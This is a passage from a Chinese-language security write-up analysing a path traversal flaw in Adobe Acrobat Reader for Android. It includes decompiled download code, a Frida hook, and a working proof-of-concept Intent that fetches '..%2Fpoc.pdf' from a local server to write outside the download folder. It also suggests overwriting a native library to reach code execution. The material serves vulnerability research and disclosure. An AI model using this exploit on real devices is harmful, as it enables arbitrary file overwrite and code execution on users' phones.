        Intrinsics.checkNotNullExpressionValue(v4, "url.toString()");
        return this.downloadUrlAtDocPath(__finalDownloadPdfFilePath__, v4) ? __finalDownloadPdfFilePath__ : null;  // [9]
    }
    
    ...
}
```

Frida代码

```javascript
ARFileFromURLDownloader.getDocPathForExternalCopy.implementation = function(str){
    console.log('[w-info] getDocPathForExternalCopy is called');
    console.log(Java.use("android.util.Log").getStackTraceString(Java.use("java.lang.Throwable").$new()));
    let ret = this.getDocPathForExternalCopy(str);
    console.log('[w-info] getDocPathForExternalCopy ret value is ' + ret);
    return ret;
};
```

打印日志，可以看到路径穿越的前提条件构造好了

```shell
[w-info] getDocPathForExternalCopy is called
java.lang.Throwable
        at com.adobe.reader.misc.ARFileFromURLDownloader.getDocPathForExternalCopy(Native Method)
        at com.adobe.reader.misc.ARFileFromURLDownloader.downloadFile(ARFileFromURLDownloader.kt:51)
        at com.adobe.reader.misc.ARFileFromURLDownloader.downloadFile(Native Method)
        at com.adobe.reader.misc.ARURLFileDownloadAsyncTask.downloadFile(ARURLFileDownloadAsyncTask.java:213)
        at com.adobe.reader.misc.ARURLFileDownloadAsyncTask.executeTask(ARURLFileDownloadAsyncTask.java:80)
        at com.adobe.libs.services.blueheron.SVFileTransferAbstractAsyncTask.doInBackground(SVFileTransferAbstractAsyncTask.java:196)
        at com.adobe.libs.services.blueheron.SVFileTransferAbstractAsyncTask.doInBackground(SVFileTransferAbstractAsyncTask.java:46)
        at android.os.AsyncTask$2.call(AsyncTask.java:333)
        at java.util.concurrent.FutureTask.run(FutureTask.java:266)
        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1167)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:641)
        at java.lang.Thread.run(Thread.java:764)

[w-info] getDocPathForExternalCopy ret value is /storage/emulated/0/Download/Adobe Acrobat/../../../../poc.pdf
```

下载的逻辑其实不需要分析逻辑，只需要看`[10]`，直接使用带`../`的文件路径进行写入，所以这里存在应用内任意私有文件写漏洞

```java
// com.adobe.reader.misc.ARURLFileDownloadAsyncTask
public final class ARFileFromURLDownloader {

    private final boolean downloadUrlAtDocPath(String __finalDownloadPdfFilePath__, String arg20) throws IOException {
        int result;
        Builder builder = new Builder();
        builder.url(arg20);
        Request request = builder.build();
        Response response = new OkHttpClient().newCall(request).execute();
        if(response != null && (response.isSuccessful())) {
            File file = new File(__finalDownloadPdfFilePath__);  // [10]
            if(file.exists()) {
                BBFileUtils.deleteFile(file);
            }
            else {
                file.getParentFile().mkdirs();
            }

            ResponseBody responseBody = response.body();  // 请求返回的pdf文件内容
            Intrinsics.checkNotNull(responseBody);
            long v2 = responseBody.contentLength();
            long v4 = -1L;
            int v8 = Long.compare(v2, v4) == 0 ? -1 : 0;
            BufferedSource bufferedSource = responseBody.source();
            BufferedSink bufferedSink = Okio.buffer(Okio.sink(file));
            Buffer buffer = bufferedSink.buffer();
            int v1 = 0;
            long v15 = 0L;
            while(true) {
                long readNum = bufferedSource.read(buffer, 0x2000L);  // 循环读取响应数据
                if(readNum == v4 || (this.downloadUrlListener.shouldCancelDownload())) {
                    break;
                }

                bufferedSink.emit();
                v15 += readNum;
                if(v8 == 0 && v2 > 0L) {
                    result = (int)(100L * v15 / v2);
                }
                else if(v8 == -1) {
                    result = (int)(v15 / 0x400L);
                }
                else {
                    result = 0;
                }

                if(result != v1) {
                    this.downloadUrlListener.onProgressUpdate(result, v8);
                    v1 = result;
                }

                v4 = -1L;
            }

            bufferedSink.flush();  // 刷新缓冲区，写入数据
            bufferedSink.close();
            bufferedSource.close();
            return this.isDownloadSuccessful(v15, v8, v15, file);
        }

        return false;
    }
```

## 0x05 漏洞调试与利用

本地开启服务，在站点根目录下放置poc.pdf文件

```shell
$ python3 -m http.server
```

构造能正常运行业务逻辑的Intent

```java
Intent intent = new Intent();
intent.setClassName("com.adobe.reader", "com.adobe.reader.AdobeReader");
intent.setDataAndType(Uri.parse("http://192.168.0.102:8000/poc.pdf"), "application/*");
intent.putExtra("hideOptionalScreen", "true");
startActivity(intent);
```

运行起来后能看到成功获取到我们放置的poc.pdf文件，且对应的下载目录出现poc.pdf

```shell
crosshatch:/sdcard $ cd Download/
crosshatch:/sdcard/Download $ ls -al
drwxrwx--x  2 root sdcard_rw     3488 2022-03-09 02:13 Adobe\ Acrobat
crosshatch:/sdcard/Download $ cd Adobe\ Acrobat/
crosshatch:/sdcard/Download/Adobe Acrobat $ ls -al
-rw-rw---- 1 root sdcard_rw 176936 2022-03-09 02:13 poc.pdf
```

现在我们修改POC，实现能够往上穿越一层路径的效果

```java
Intent intent = new Intent();
intent.setClassName("com.adobe.reader", "com.adobe.reader.AdobeReader");
intent.setDataAndType(Uri.parse("http://192.168.0.102:8000/..%2Fpoc.pdf"), "application/*");
intent.putExtra("hideOptionalScreen", "true");
startActivity(intent);
```

成功实现穿越

```shell
crosshatch:/sdcard/Download $ ls -al
drwxrwx--x  2 root sdcard_rw     3488 2022-03-09 02:13 Adobe\ Acrobat
-rw-rw----  1 root sdcard_rw   176936 2022-03-09 02:38 poc.pdf
```

这时候我们就该思考一个关键问题了：有没有什么文件覆盖掉之后能造成任意代码执行？

通过对本应用私有目录的分析，发现有动态库可以覆写

Adobe官方对该漏洞的修复是使用正则匹配路径中的非法字符

## 0x06 漏洞研究

整个流程分析下来，我们可以明显感受到该漏洞所执行的代码只占业务逻辑相当小的一部分，我们完全可以对其它分支进行进一步的研究

## 0x07 References

- https://hulkvision.github.io/blog/post1/

## 附录：调试过程记录

Frida运行命令

```shell
$ frida -U -f com.adobe.reader -l frida_hook.js --no-pause
```

启动本地服务器

```shell
$ python3 -m http.server
```